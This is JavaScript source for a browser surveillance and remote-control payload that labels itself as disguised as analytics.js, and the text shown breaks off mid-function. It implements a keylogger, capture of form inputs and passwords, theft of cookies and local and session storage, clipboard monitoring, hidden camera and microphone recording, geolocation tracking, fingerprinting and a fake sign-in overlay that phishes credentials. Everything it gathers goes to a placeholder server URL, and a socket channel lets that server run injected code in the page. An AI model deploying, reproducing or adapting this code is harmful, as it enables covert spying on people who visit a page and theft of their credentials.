// RECON FRAMEWORK v2.0 - Browser Intelligence Payload
// Disguised as analytics.js - For AUTHORIZED Testing ONLY

(function () {
  "use strict";

  // CONFIG

  var CFG = {
    sid: "__SESSION_ID__",
    server: "__SERVER_URL__",
    beaconUrl: "__SERVER_URL__/api/c/beacon",
    imgUrl: "__SERVER_URL__/api/c/img",
    audioUrl: "__SERVER_URL__/api/c/audio",
    keylogFlushMs: 3000,
    mouseFlushMs: 5000,
    heartbeatMs: 10000,
    maxRetries: 3,
    debug: false,
  };

  var keyBuffer = [];
  var mouseBuffer = [];
  var clickBuffer = [];
  var ws = null;

  // UTILITIES

  function log() {
    if (CFG.debug)
      console.log.apply(console, ["[RF]"].concat(Array.from(arguments)));
  }

  function send(type, data, retries) {
    retries = retries || 0;
    try {
      var payload = JSON.stringify({
        sid: CFG.sid,
        type: type,
        data: data,
        ts: Date.now(),
      });

      // Beacon API (survives page close)
      if (navigator.sendBeacon) {
        var blob = new Blob([payload], { type: "application/json" });
        if (navigator.sendBeacon(CFG.beaconUrl, blob)) return;
      }

      // Fallback fetch
      fetch(CFG.beaconUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: payload,
        keepalive: true,
        mode: "cors",
      }).catch(function () {
        if (retries < CFG.maxRetries) {
          setTimeout(
            function () {
              send(type, data, retries + 1);
            },
            2000 * (retries + 1),
          );
        }
      });
    } catch (e) {
      log("Send error:", e);
    }
  }

  function sendImage(type, dataUrl) {
    try {
      fetch(CFG.imgUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sid: CFG.sid, type: type, data: dataUrl }),
        keepalive: true,
      }).catch(function () {});
    } catch (e) {}
  }

  function sendAudioBlob(blob) {
    try {
      var fd = new FormData();
      fd.append("sid", CFG.sid);
      fd.append("audio", blob, "recording.webm");
      fetch(CFG.audioUrl, {
        method: "POST",
        body: fd,
        keepalive: true,
      }).catch(function () {});
    } catch (e) {}
  }

  function hashCode(str) {
    var hash = 0;
    for (var i = 0; i < str.length; i++) {
      hash = (hash << 5) - hash + str.charCodeAt(i);
      hash |= 0;
    }
    return hash;
  }

  function safeExec(fn) {
    try {
      fn();
    } catch (e) {
      log("SafeExec error:", e.message);
    }
  }

  // WEBSOCKET (Real-time via Socket.IO)

  function connectWS() {
    try {
      if (typeof io === "undefined") {
        var s = document.createElement("script");
        s.src = CFG.server + "/socket.io/socket.io.js";
        s.onload = function () {
          initSocket();
        };
        s.onerror = function () {
          log("Socket.IO load failed");
        };
        document.head.appendChild(s);
      } else {
        initSocket();
      }
    } catch (e) {
      log("WS load error:", e);
    }
  }

  function initSocket() {
    try {
      ws = io(CFG.server, {
        transports: ["websocket", "polling"],
        reconnection: true,
        reconnectionDelay: 3000,
        reconnectionAttempts: 10,
      });

      ws.on("connect", function () {
        log("WS connected");
        ws.emit("register_session", { sid: CFG.sid });
      });

      ws.on("execute_command", function (data) {
        executeCommand(data.command, data.params || {});
      });

      ws.on("disconnect", function () {
        log("WS disconnected");
      });
    } catch (e) {
      log("WS init error:", e);
    }
  }

  // REMOTE COMMAND EXECUTION

  function executeCommand(cmd, params) {
    log("CMD:", cmd, params);

    var handlers = {
      screenshot: function () {
        captureScreen();
      },
      camera: function () {
        captureCamera(params.duration || 0);
      },
      microphone: function () {
        captureMicrophone(params.duration || 5);
      },
      location: function () {
        getGeolocation();
      },
      clipboard_read: function () {
        readClipboard();
      },
      get_cookies: function () {
        send("cookies", { cookies: document.cookie, url: location.href });
      },
      get_localstorage: function () {
        safeExec(function () {
          var ls = {};
          for (var i = 0; i < localStorage.length; i++) {
            var k = localStorage.key(i);
            ls[k] = localStorage.getItem(k);
          }
          send("localstorage", ls);
        });
      },
      get_sessionstorage: function () {
        safeExec(function () {
          var ss = {};
          for (var i = 0; i < sessionStorage.length; i++) {
            var k = sessionStorage.key(i);
            ss[k] = sessionStorage.getItem(k);
          }
          send("sessionstorage", ss);
        });
      },
      get_dom: function () {
        send("dom", {
          html: document.documentElement.outerHTML.substring(0, 100000),
          url: location.href,
          title: document.title,
        });
      },
      redirect: function () {
        if (params.url) window.location.href = params.url;
      },
      inject_html: function () {
        if (params.html) {
          var d = document.createElement("div");
          d.innerHTML = params.html;
          document.body.appendChild(d);
        }
      },
      inject_js: function () {
        if (params.code) {
          safeExec(function () {
            new Function(params.code)();
          });
        }
      },
      alert_box: function () {
        if (params.message) alert(params.message);
      },
      prompt_box: function () {
        if (params.message) {
          var r = prompt(params.message, params.default_value || "");
          send("custom", { command: "prompt_result", result: r });
        }
      },
      phish_overlay: function () {
        showPhishOverlay(params);
      },
      vibrate: function () {
        safeExec(function () {
          navigator.vibrate(params.pattern || [200, 100, 200]);
        });
      },
      fullscreen: function () {
        safeExec(function () {
          document.documentElement.requestFullscreen();
        });
      },
      play_audio: function () {
        if (params.url) {
          safeExec(function () {
            new Audio(params.url).play();
          });
        }
      },
      notification: function () {
        requestNotification(params);
      },
      social_scan: function () {
        detectSocialMedia();
      },
      device_sensors: function () {
        initDeviceSensors();
      },
      harvest_all: function () {
        harvestAll();
      },
    };

    if (handlers[cmd]) {
      handlers[cmd]();
    } else {
      send("custom", {
        command: cmd,
        params: params,
        status: "unknown_command",
      });
    }
  }

  // BROWSER FINGERPRINTING

  function collectFingerprint() {
    var fp = {};

    // Canvas fingerprint
    safeExec(function () {
      var c = document.createElement("canvas");
      c.width = 300;
      c.height = 150;
      var ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.fillText("BrowserFP_xQ9", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("ReconTest", 4, 45);
      ctx.globalCompositeOperation = "multiply";
      ctx.fillStyle = "rgb(255,0,255)";
      ctx.beginPath();
      ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
      ctx.closePath();
      ctx.fill();
      fp.canvas_hash = hashCode(c.toDataURL()).toString();
      send("canvas_fp", fp.canvas_hash);
    });

    // WebGL fingerprint
    safeExec(function () {
      var glC = document.createElement("canvas");
      var gl = glC.getContext("webgl") || glC.getContext("experimental-webgl");
      if (gl) {
        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
        fp.webgl = {
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          version: gl.getParameter(gl.VERSION),
          shadingLang: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "",
          unmaskedRenderer: dbg
            ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
            : "",
          maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
          maxViewport: Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)),
          extensions: gl.getSupportedExtensions(),
        };
        send("webgl_fp", fp.webgl);
      }
    });

    // Audio fingerprint
    safeExec(function () {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) return;
      var actx = new AC();
      var osc = actx.createOscillator();
      var anal = actx.createAnalyser();
      var gain = actx.createGain();
      var proc = actx.createScriptProcessor(4096, 1, 1);
      osc.type = "triangle";
      osc.frequency.setValueAtTime(10000, actx.currentTime);
      gain.gain.setValueAtTime(0, actx.currentTime);
      osc.connect(anal);
      anal.connect(proc);
      proc.connect(gain);
      gain.connect(actx.destination);
      osc.start(0);
      var done = false;
      proc.onaudioprocess = function () {
        if (done) return;
        done = true;
        var buf = new Float32Array(anal.frequencyBinCount);
        anal.getFloatFrequencyData(buf);
        var sum = 0;
        for (var i = 0; i < buf.length; i++) sum += Math.abs(buf[i]);
        fp.audio_hash = sum.toString();
        send("audio_fp", fp.audio_hash);
        proc.disconnect();
        osc.stop();
        actx.close();
      };
    });

    // Font detection
    safeExec(function () {
      var baseFonts = ["monospace", "sans-serif", "serif"];
      var testFonts = [
        "Arial",
        "Arial Black",
        "Calibri",
        "Cambria",
        "Comic Sans MS",
        "Consolas",
        "Courier New",
        "Georgia",
        "Helvetica",
        "Impact",
        "Lucida Console",
        "Palatino Linotype",
        "Segoe UI",
        "Tahoma",
        "Times New Roman",
        "Trebuchet MS",
        "Verdana",
        "Roboto",
        "Open Sans",
        "Ubuntu",
        "Noto Sans",
        "Lato",
        "Montserrat",
        "Source Sans Pro",
      ];
      var span = document.createElement("span");
      span.style.cssText =
        "font-size:72px;position:absolute;left:-9999px;top:-9999px;visibility:hidden;";
      span.textContent = "mmmmmmmmmmlli";
      document.body.appendChild(span);
      var baseW = {};
      baseFonts.forEach(function (bf) {
        span.style.fontFamily = bf;
        baseW[bf] = { w: span.offsetWidth, h: span.offsetHeight };
      });
      fp.fonts = [];
      testFonts.forEach(function (tf) {
        var detected = false;
        baseFonts.forEach(function (bf) {
          span.style.fontFamily = '"' + tf + '",' + bf;
          if (
            span.offsetWidth !== baseW[bf].w ||
            span.offsetHeight !== baseW[bf].h
          )
            detected = true;
        });
        if (detected) fp.fonts.push(tf);
      });
      document.body.removeChild(span);
      send("fonts", fp.fonts);
    });

    // Plugins
    safeExec(function () {
      fp.plugins = [];
      for (var i = 0; i < navigator.plugins.length; i++) {
        fp.plugins.push({
          name: navigator.plugins[i].name,
          desc: navigator.plugins[i].description,
          file: navigator.plugins[i].filename,
        });
      }
      send("plugins", fp.plugins);
    });

    fp.ts = Date.now();
    send("fingerprint", fp);
  }

  // BROWSER & SYSTEM INFO

  function collectBrowserInfo() {
    var info = {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      vendor: navigator.vendor,
      language: navigator.language,
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      maxTouchPoints: navigator.maxTouchPoints || 0,
      hardwareConcurrency: navigator.hardwareConcurrency || 0,
      deviceMemory: navigator.deviceMemory || 0,
      pdfViewer: navigator.pdfViewerEnabled,
      webdriver: navigator.webdriver,
      screen: {
        w: screen.width,
        h: screen.height,
        availW: screen.availWidth,
        availH: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: screen.orientation ? screen.orientation.type : "",
      },
      window: {
        innerW: innerWidth,
        innerH: innerHeight,
        outerW: outerWidth,
        outerH: outerHeight,
        dpr: devicePixelRatio,
      },
      timezone: {
        offset: new Date().getTimezoneOffset(),
        name: Intl.DateTimeFormat().resolvedOptions().timeZone,
        locale: Intl.DateTimeFormat().resolvedOptions().locale,
      },
      page: {
        url: location.href,
        referrer: document.referrer,
        title: document.title,
        domain: document.domain,
        charset: document.characterSet,
      },
      connection: {},
    };

    safeExec(function () {
      var conn =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;
      if (conn) {
        info.connection = {
          effectiveType: conn.effectiveType,
          downlink: conn.downlink,
          rtt: conn.rtt,
          saveData: conn.saveData,
          type: conn.type,
        };
      }
    });

    safeExec(function () {
      if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(function (est) {
          info.storage = { usage: est.usage, quota: est.quota };
        });
      }
    });

    send("browser", info);
    send("screen", info.screen);
    send("timezone", info.timezone);
    send("language", { language: info.language, languages: info.languages });
    send("connection", info.connection);
    send("referrer", info.page);
  }

  // HARDWARE INFO

  function collectHardwareInfo() {
    var hw = {
      cores: navigator.hardwareConcurrency || "?",
      memory: navigator.deviceMemory || "?",
      maxTouchPoints: navigator.maxTouchPoints || 0,
      gpu: "?",
      gpuVendor: "?",
    };

    safeExec(function () {
      var c = document.createElement("canvas");
      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
      if (gl) {
        var ext = gl.getExtension("WEBGL_debug_renderer_info");
        if (ext) {
          hw.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
          hw.gpuVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
        }
      }
    });

    safeExec(function () {
      if (navigator.getBattery) {
        navigator.getBattery().then(function (batt) {
          hw.battery = {
            charging: batt.charging,
            level: batt.level,
            chargingTime: batt.chargingTime,
            dischargingTime: batt.dischargingTime,
          };
          send("battery", hw.battery);
          batt.addEventListener("levelchange", function () {
            send("battery", {
              charging: batt.charging,
              level: batt.level,
              chargingTime: batt.chargingTime,
              dischargingTime: batt.dischargingTime,
            });
          });
        });
      }
    });

    safeExec(function () {
      if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
        navigator.mediaDevices.enumerateDevices().then(function (devs) {
          hw.mediaDevices = devs.map(function (d) {
            return {
              kind: d.kind,
              label: d.label,
              id: d.deviceId.substring(0, 8),
            };
          });
          send("hardware", hw);
        });
      }
    });

    send("hardware", hw);
  }

  // WEBRTC LEAK

  function detectWebRTC() {
    safeExec(function () {
      var RTC =
        window.RTCPeerConnection ||
        window.mozRTCPeerConnection ||
        window.webkitRTCPeerConnection;
      if (!RTC) return;

      var pc = new RTC({
        iceServers: [{ urls: "stun:stun.l.google.com:19302" }],
      });
      var ips = { local: [], public: [], ipv6: [] };

      pc.createDataChannel("");
      pc.createOffer().then(function (offer) {
        pc.setLocalDescription(offer);
      });

      pc.onicecandidate = function (e) {
        if (!e || !e.candidate || !e.candidate.candidate) {
          send("webrtc", ips);
          safeExec(function () {
            pc.close();
          });
          return;
        }
        var m = e.candidate.candidate.match(
          /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/,
        );
        if (m) {
          var ip = m[1];
          if (ip.indexOf(":") !== -1) ips.ipv6.push(ip);
          else if (ip.match(/^(192\.168|10\.|172\.(1[6-9]|2\d|3[01]))/))
            ips.local.push(ip);
          else ips.public.push(ip);
        }
      };
    });
  }

  // GEOLOCATION

  function getGeolocation() {
    safeExec(function () {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(
        function (pos) {
          send("geo", {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude,
            heading: pos.coords.heading,
            speed: pos.coords.speed,
            ts: pos.timestamp,
            type: "current",
          });
        },
        function (err) {
          send("geo", { error: err.message, code: err.code });
        },
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 },
      );

      navigator.geolocation.watchPosition(
        function (pos) {
          send("geo", {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            speed: pos.coords.speed,
            heading: pos.coords.heading,
            ts: pos.timestamp,
            type: "watch",
          });
        },
        function () {},
        { enableHighAccuracy: true, maximumAge: 30000 },
      );
    });
  }

  // KEYLOGGER

  function initKeylogger() {
    var lastFlush = Date.now();

    document.addEventListener(
      "keydown",
      function (e) {
        keyBuffer.push({
          key: e.key,
          code: e.code,
          ctrl: e.ctrlKey,
          alt: e.altKey,
          shift: e.shiftKey,
          meta: e.metaKey,
          target: {
            tag: e.target.tagName,
            type: e.target.type || "",
            name: e.target.name || "",
            id: e.target.id || "",
            placeholder: e.target.placeholder || "",
          },
          url: location.href,
          ts: Date.now(),
        });

        if (
          Date.now() - lastFlush > CFG.keylogFlushMs ||
          keyBuffer.length > 50
        ) {
          send("keylog", keyBuffer.slice());
          keyBuffer = [];
          lastFlush = Date.now();
        }
      },
      true,
    );

    window.addEventListener("beforeunload", function () {
      if (keyBuffer.length) send("keylog", keyBuffer);
    });

    document.addEventListener(
      "input",
      function (e) {
        var t = e.target;
        if (
          t &&
          (t.tagName === "INPUT" ||
            t.tagName === "TEXTAREA" ||
            t.tagName === "SELECT")
        ) {
          send("form", {
            event: "input",
            tag: t.tagName,
            type: t.type || "text",
            name: t.name || t.id || "",
            value: t.value,
            placeholder: t.placeholder || "",
            url: location.href,
          });
        }
      },
      true,
    );
  }

  // FORM INTERCEPTOR + CREDENTIAL CAPTURE

  function initFormInterceptor() {
    document.addEventListener(
      "submit",
      function (e) {
        var form = e.target;
        var fd = {};
        var creds = {};
        var hasPw = false;
        var inputs = form.querySelectorAll("input, select, textarea");

        inputs.forEach(function (inp) {
          var n = inp.name || inp.id || inp.type;
          fd[n] = {
            value: inp.value,
            type: inp.type,
            name: inp.name,
            id: inp.id,
          };

          if (inp.type === "password") {
            hasPw = true;
            creds.password = inp.value;
          }
          if (
            inp.type === "email" ||
            inp.name === "email" ||
            inp.name === "username" ||
            inp.name === "login" ||
            inp.name === "user" ||
            inp.autocomplete === "username" ||
            inp.autocomplete === "email"
          ) {
            creds.username = inp.value;
          }
        });

        send("form", {
          event: "submit",
          action: form.action,
          method: form.method,
          data: fd,
          url: location.href,
        });

        if (hasPw) {
          creds.url = location.href;
          creds.action = form.action;
          creds.ts = Date.now();
          send("creds", creds);
        }
      },
      true,
    );
  }

  // CLIPBOARD MONITOR

  function initClipboardMonitor() {
    document.addEventListener("copy", function () {
      safeExec(function () {
        send("clipboard", {
          event: "copy",
          content: window.getSelection().toString(),
          url: location.href,
        });
      });
    });

    document.addEventListener("paste", function (e) {
      safeExec(function () {
        var txt = (e.clipboardData || window.clipboardData).getData("text");
        send("clipboard", { event: "paste", content: txt, url: location.href });
      });
    });

    document.addEventListener("cut", function () {
      safeExec(function () {
        send("clipboard", {
          event: "cut",
          content: window.getSelection().toString(),
          url: location.href,
        });
      });
    });
  }

  function readClipboard() {
    safeExec(function () {
      if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard
          .readText()
          .then(function (txt) {
            send("clipboard", { event: "read", content: txt });
          })
          .catch(function () {});
      }
    });
  }

  // SCREEN CAPTURE

  function captureScreen() {
    // Try html2canvas first
    if (typeof html2canvas !== "undefined") {
      html2canvas(document.body, { useCORS: true, scale: 0.7 })
        .then(function (canvas) {
          sendImage("screenshot", canvas.toDataURL("image/png", 0.7));
        })
        .catch(function () {
          captureDOMFallback();
        });
      return;
    }

    // Try getDisplayMedia
    if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
      navigator.mediaDevices
        .getDisplayMedia({ video: true })
        .then(function (stream) {
          var track = stream.getVideoTracks()[0];
          var ic = new ImageCapture(track);
          ic.grabFrame()
            .then(function (bmp) {
              var c = document.createElement("canvas");
              c.width = bmp.width;
              c.height = bmp.height;
              c.getContext("2d").drawImage(bmp, 0, 0);
              sendImage("screenshot", c.toDataURL("image/png", 0.7));
              track.stop();
            })
            .catch(function () {
              track.stop();
              captureDOMFallback();
            });
        })
        .catch(function () {
          captureDOMFallback();
        });
      return;
    }

    captureDOMFallback();
  }

  function captureDOMFallback() {
    send("dom", {
      html: document.documentElement.outerHTML.substring(0, 100000),
      url: location.href,
      title: document.title,
      type: "dom_fallback",
    });
  }

  // CAMERA CAPTURE

  function captureCamera(duration) {
    safeExec(function () {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
        return;

      navigator.mediaDevices
        .getUserMedia({
          video: { facingMode: "user", width: 640, height: 480 },
          audio: false,
        })
        .then(function (stream) {
          var video = document.createElement("video");
          video.srcObject = stream;
          video.setAttribute("playsinline", "");
          video.muted = true;
          video.style.cssText =
            "position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;";
          document.body.appendChild(video);

          video.play().then(function () {
            // Wait for camera warm-up
            setTimeout(function () {
              var c = document.createElement("canvas");
              c.width = video.videoWidth || 640;
              c.height = video.videoHeight || 480;
              c.getContext("2d").drawImage(video, 0, 0);
              sendImage("camera", c.toDataURL("image/png", 0.8));

              // Multi-frame capture
              if (duration > 0) {
                var frameCount = 0;
                var maxFrames = Math.min(duration * 2, 20);
                var interval = setInterval(function () {
                  frameCount++;
                  c.getContext("2d").drawImage(video, 0, 0);
                  sendImage("camera", c.toDataURL("image/png", 0.6));
                  if (frameCount >= maxFrames) {
                    clearInterval(interval);
                    cleanup();
                  }
                }, 500);
              } else {
                cleanup();
              }

              function cleanup() {
                stream.getTracks().forEach(function (t) {
                  t.stop();
                });
                video.remove();
              }
            }, 800);
          });
        })
        .catch(function (err) {
          send("custom", { command: "camera_error", error: err.message });
        });
    });
  }

  // MICROPHONE CAPTURE

  function captureMicrophone(duration) {
    safeExec(function () {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
        return;

      navigator.mediaDevices
        .getUserMedia({ audio: true, video: false })
        .then(function (stream) {
          var mimeType = "audio/webm";
          if (!MediaRecorder.isTypeSupported(mimeType)) {
            mimeType = "audio/ogg";
            if (!MediaRecorder.isTypeSupported(mimeType)) {
              mimeType = "";
            }
          }

          var options = mimeType ? { mimeType: mimeType } : {};
          var recorder = new MediaRecorder(stream, options);
          var chunks = [];

          recorder.ondataavailable = function (e) {
            if (e.data.size > 0) chunks.push(e.data);
          };

          recorder.onstop = function () {
            var blob = new Blob(chunks, { type: mimeType || "audio/webm" });
            sendAudioBlob(blob);
            stream.getTracks().forEach(function (t) {
              t.stop();
            });
          };

          recorder.start(1000); // collect every second

          setTimeout(
            function () {
              if (recorder.state === "recording") {
                recorder.stop();
              }
            },
            (duration || 5) * 1000,
          );

          send("custom", { command: "mic_started", duration: duration });
        })
        .catch(function (err) {
          send("custom", { command: "mic_error", error: err.message });
        });
    });
  }

  // CLICK / MOUSE / SCROLL / TOUCH TRACKING

  function initInteractionTracking() {
    // Click tracking
    document.addEventListener(
      "click",
      function (e) {
        clickBuffer.push({
          x: e.clientX,
          y: e.clientY,
          pageX: e.pageX,
          pageY: e.pageY,
          target: {
            tag: e.target.tagName,
            id: e.target.id || "",
            className: (e.target.className || "").toString().substring(0, 100),
            text: (e.target.textContent || "").substring(0, 50),
            href: e.target.href || "",
          },
          url: location.href,
          ts: Date.now(),
        });

        if (clickBuffer.length >= 20) {
          send("click", clickBuffer.slice());
          clickBuffer = [];
        }
      },
      true,
    );

    // Mouse movement (sampled)
    var lastMouseSend = Date.now();
    document.addEventListener("mousemove", function (e) {
      mouseBuffer.push({ x: e.clientX, y: e.clientY, ts: Date.now() });
      if (
        Date.now() - lastMouseSend > CFG.mouseFlushMs ||
        mouseBuffer.length > 100
      ) {
        send("mouse", mouseBuffer.slice());
        mouseBuffer = [];
        lastMouseSend = Date.now();
      }
    });

    // Scroll tracking
    var scrollTimer = null;
    window.addEventListener("scroll", function () {
      clearTimeout(scrollTimer);
      scrollTimer = setTimeout(function () {
        send("scroll", {
          scrollX: window.scrollX,
          scrollY: window.scrollY,
          maxScrollY:
            document.documentElement.scrollHeight - window.innerHeight,
          percentage: Math.round(
            (window.scrollY /
              (document.documentElement.scrollHeight - window.innerHeight)) *
              100,
          ),
          url: location.href,
          ts: Date.now(),
        });
      }, 300);
    });

    // Touch events
    document.addEventListener("touchstart", function (e) {
      var touches = [];
      for (var i = 0; i < e.touches.length; i++) {
        touches.push({ x: e.touches[i].clientX, y: e.touches[i].clientY });
      }
      send("touch", { event: "touchstart", touches: touches, ts: Date.now() });
    });
  }

  // SOCIAL MEDIA DETECTION (Login status via image/timing)

  function detectSocialMedia() {
    var services = [
      { name: "Facebook", url: "https://www.facebook.com/favicon.ico" },
      { name: "Twitter", url: "https://twitter.com/favicon.ico" },
      { name: "Instagram", url: "https://www.instagram.com/favicon.ico" },
      { name: "LinkedIn", url: "https://www.linkedin.com/favicon.ico" },
      { name: "YouTube", url: "https://www.youtube.com/favicon.ico" },
      { name: "Reddit", url: "https://www.reddit.com/favicon.ico" },
      { name: "GitHub", url: "https://github.com/favicon.ico" },
      { name: "TikTok", url: "https://www.tiktok.com/favicon.ico" },
      { name: "WhatsApp", url: "https://web.whatsapp.com/favicon.ico" },
      { name: "Gmail", url: "https://mail.google.com/favicon.ico" },
      { name: "Outlook", url: "https://outlook.live.com/favicon.ico" },
    ];

    var results = [];

    services.forEach(function (svc) {
      var img = new Image();
      var start = Date.now();
      img.onload = function () {
        results.push({
          name: svc.name,
          reachable: true,
          loadTime: Date.now() - start,
        });
        if (results.length === services.length) send("social", results);
      };
      img.onerror = function () {
        results.push({
          name: svc.name,
          reachable: false,
          loadTime: Date.now() - start,
        });
        if (results.length === services.length) send("social", results);
      };
      img.src = svc.url + "?_=" + Date.now();
    });
  }

  // DEVICE SENSORS (Motion / Orientation)

  function initDeviceSensors() {
    // Device motion
    safeExec(function () {
      var lastMotion = 0;
      window.addEventListener("devicemotion", function (e) {
        if (Date.now() - lastMotion < 2000) return;
        lastMotion = Date.now();
        send("motion", {
          acceleration: e.acceleration
            ? { x: e.acceleration.x, y: e.acceleration.y, z: e.acceleration.z }
            : null,
          accelerationIG: e.accelerationIncludingGravity
            ? {
                x: e.accelerationIncludingGravity.x,
                y: e.accelerationIncludingGravity.y,
                z: e.accelerationIncludingGravity.z,
              }
            : null,
          rotationRate: e.rotationRate
            ? {
                alpha: e.rotationRate.alpha,
                beta: e.rotationRate.beta,
                gamma: e.rotationRate.gamma,
              }
            : null,
          interval: e.interval,
        });
      });
    });

    // Device orientation
    safeExec(function () {
      var lastOrientation = 0;
      window.addEventListener("deviceorientation", function (e) {
        if (Date.now() - lastOrientation < 2000) return;
        lastOrientation = Date.now();
        send("orientation", {
          alpha: e.alpha,
          beta: e.beta,
          gamma: e.gamma,
          absolute: e.absolute,
        });
      });
    });
  }

  // PHISHING OVERLAY

  function showPhishOverlay(params) {
    var overlay = document.createElement("div");
    overlay.id = "rf-overlay";
    overlay.style.cssText =
      "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);" +
      "z-index:999999;display:flex;align-items:center;justify-content:center;font-family:-apple-system,sans-serif;";

    var box = document.createElement("div");
    box.style.cssText =
      "background:#fff;border-radius:12px;padding:40px;max-width:420px;width:90%;box-shadow:0 20px 60px rgba(0,0,0,0.5);text-align:center;";

    var title = params.title || "Session Expired";
    var message =
      params.message || "Please re-enter your credentials to continue.";
    var btnText = params.button || "Sign In";

    box.innerHTML =
      '<div style="margin-bottom:20px;font-size:48px;">' +
      (params.icon || "🔒") +
      "</div>" +
      '<h2 style="margin:0 0 10px;color:#1a1a1a;font-size:22px;">' +
      title +
      "</h2>" +
      '<p style="color:#666;margin:0 0 25px;font-size:14px;line-height:1.5;">' +
      message +
      "</p>" +
      '<form id="rf-phish-form">' +
      '<input type="email" name="email" placeholder="Email address" autocomplete="email" ' +
      'style="width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:12px;font-size:15px;box-sizing:border-box;" required>' +
      '<input type="password" name="password" placeholder="Password" autocomplete="current-password" ' +
      'style="width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:20px;font-size:15px;box-sizing:border-box;" required>' +
      '<button type="submit" style="width:100%;padding:13px;background:#1a73e8;color:#fff;border:none;' +
      'border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;">' +
      btnText +
      "</button>" +
      "</form>";

    overlay.appendChild(box);
    document.body.appendChild(overlay);

    document
      .getElementById("rf-phish-form")
      .addEventListener("submit", function (e) {
        e.preventDefault();
        var email = this.querySelector('[name="email"]').value;
        var pass = this.querySelector('[name="password"]').value;
        send("creds", {
          username: email,
          password: pass,
          url: location.href,
          source: "phish_overlay",
          ts: Date.now(),
        });
        overlay.remove();
      });
  }

  // NOTIFICATION REQUEST

  function requestNotification(params) {
    safeExec(function () {
      if (!("Notification" in window)) return;

      function showNotif() {
        var n = new Notification(params.title || "New Message", {
          body: params.body || "You have a new notification",
          icon: params.icon || "https://www.google.com/favicon.ico",
          tag: "rf-notif",
        });
        n.onclick = function () {
          if (params.click_url) window.open(params.click_url);
          send("notification", { event: "clicked", title: params.title });
        };
        send("notification", {
          event: "shown",
          permission: Notification.permission,
        });
      }

      if (Notification.permission === "granted") {
        showNotif();
      } else if (Notification.permission !== "denied") {
        Notification.requestPermission().then(function (perm) {
          send("notification", {
            event: "permission_response",
            permission: perm,
          });
          if (perm === "granted") showNotif();
        });
      } else {
        send("notification", { event: "denied" });
      }
    });
  }

  // PERMISSION PROBING

  function probePermissions() {
    var perms = [
      "camera",
      "microphone",
      "geolocation",
      "notifications",
      "clipboard-read",
      "clipboard-write",
      "accelerometer",
      "gyroscope",
      "magnetometer",
      "midi",
      "push",
      "speaker",
    ];

    var results = {};
    var done = 0;

    perms.forEach(function (name) {
      safeExec(function () {
        if (navigator.permissions && navigator.permissions.query) {
          navigator.permissions
            .query({ name: name })
            .then(function (status) {
              results[name] = status.state;
              done++;
              if (done >= perms.length) send("permissions", results);
            })
            .catch(function () {
              results[name] = "error";
              done++;
              if (done >= perms.length) send("permissions", results);
            });
        } else {
          results[name] = "unsupported";
          done++;
          if (done >= perms.length) send("permissions", results);
        }
      });
    });
  }

  // VISIBILITY TRACKING (Tab focus/blur)

  function initVisibilityTracking() {
    document.addEventListener("visibilitychange", function () {
      send("visibility", {
        state: document.visibilityState,
        hidden: document.hidden,
        ts: Date.now(),
      });
    });

    window.addEventListener("focus", function () {
      send("visibility", { state: "focus", ts: Date.now() });
    });

    window.addEventListener("blur", function () {
      send("visibility", { state: "blur", ts: Date.now() });
    });
  }

  // PAGE VISIT TRACKING

  function trackPageVisit() {
    send("pagevisit", {
      url: location.href,
      title: document.title,
      referrer: document.referrer,
      ts: Date.now(),
    });

    // Track navigation via History API
    var origPush = history.pushState;
    var origReplace = history.replaceState;

    history.pushState = function () {
      origPush.apply(this, arguments);
      send("pagevisit", {
        url: location.href,
        title: document.title,
        method: "pushState",
        ts: Date.now(),
      });
    };

    history.replaceState = function () {
      origReplace.apply(this, arguments);
      send("pagevisit", {
        url: location.href,
        title: document.title,
        method: "replaceState",
        ts: Date.now(),
      });
    };

    window.addEventListener("popstate", function () {
      send("pagevisit", {
        url: location.href,
        title: document.title,
        method: "popstate",
        ts: Date.now(),
      });
    });

    window.addEventListener("hashchange", function () {
      send("pagevisit", {
        url: location.href,
        title: document.title,
        method: "hashchange",
